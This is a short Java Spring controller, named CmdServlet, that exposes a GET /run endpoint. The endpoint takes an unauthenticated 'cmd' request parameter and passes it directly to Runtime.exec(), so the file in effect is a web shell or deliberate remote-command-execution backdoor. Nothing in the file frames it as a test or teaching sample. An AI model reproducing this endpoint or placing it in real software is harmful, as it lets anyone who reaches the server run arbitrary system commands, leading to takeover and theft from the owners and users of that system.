import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class CmdServlet {
    @GetMapping("/run")
    public String run(@RequestParam String cmd) throws Exception {
        Runtime.getRuntime().exec(cmd);
        return "ok";
    }
}
